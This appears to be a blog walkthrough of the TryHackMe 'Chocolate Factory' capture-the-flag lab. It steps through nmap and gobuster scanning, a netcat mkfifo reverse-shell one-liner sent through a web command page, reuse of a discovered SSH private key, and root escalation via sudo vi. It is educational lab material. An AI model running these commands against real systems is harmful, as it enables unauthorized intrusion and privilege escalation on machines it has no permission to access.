---
layout: post
title: Tryhackme | Chocolate Factory Walkthrough 
date: 2021-02-03
description: You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. # Add post description (optional)
img: cholocate.tryhackme/titlephoto1.jpg # Add image post (optional)
tags: [Tryhackme, CTF] # add tag
---
Today’s blog post — I will give a walk-through on room called, “Chocolate Factory”. This is perfect practice for Beginners. 
Let’s get started. Firstly Deploy the machine and wait a minute for getting the IP address to start.

![init]({{site.baseurl}}/assets/img/cholocate.tryhackme/init.png)


## Reconnaissance
 
     sudo nmap -sV -sC -v <ip>
    
     -sV: Probe open ports to determine service/version info 
     -sC: equivalent to --script=default 
      -v: verbose mode 
     
The result looks like,<br />

  
  ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/init1.png)
   

There can see FTP running on port 21, ssh running on port 22, and webserver in port 80 Then try Open browser enter IP address default web server running in port 80 
  
  ![nmap]({{site.baseurl}}/assets/img/cholocate.tryhackme/init2.png)

I trying SQL injection but nothing changes, So Check the directories using the gobuster tool.

    gobuser dir -u <ip> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 
#### Enumeration 

OK.. Here see home.php <br />
 ![nmap]({{site.baseurl}}/assets/img/cholocate.tryhackme/command.ls.png)  
  Try system commands then reverse connection command 
  
     'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f'
 
  Remember one thing disable ufw firewall before the listening netcat. <br />
  
     nc -lvnp <port> 
    -l listen mode, for inbound connects 
    -v verbose 
    -n numeric-only IP addresses, no DNS 
    -p local port number
    
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/reverse2.png) 
   
   Use python3 shell for better interaction <br />
      
      python3 -c 'import pty; pty.spawn("/bin/sh")' 
      
   Then list out the file and read the file..
   
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/cat.key.png)
  
   Read validate.php
   
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/validateuser.png)
   
   Change the user to charlie <br/>
   /home/charlie and list all files <br />
   Found RSA key in this folder called teleport and I copied it to my machine and saved that under the name id_rsa.change the permission.
   
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/id_rsa.png) <br />
   
    chmod 600 filename 
    
   Login with ssh charlie user
    
  ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/sshcharlie.png) <br />
  Read the user key <br />
  ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/userflag.png) 
   
 ## Privilege Escalation
 <br />
  Check the current user privilege 
   
     sudo -l 
    
 <br/>
 ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/userprivilege.png) <br />
   Get root permission using vi.<br />
   Use this website [GTFOBINS](http://gtfobins.github.io/) <br />
   Search vi get result 
   
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/gtbl.png) <br />
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/root.png) <br />
   Copy the command and paste into the terminal and hit enter <br />
   Now root user <br >
   Change charlie to root <br />
   
    su root
   
   
   List the files and run python file, enter the key 
   ![success]({{site.baseurl}}/assets/img/cholocate.tryhackme/root3.png) <br />
   DONE !!!
  
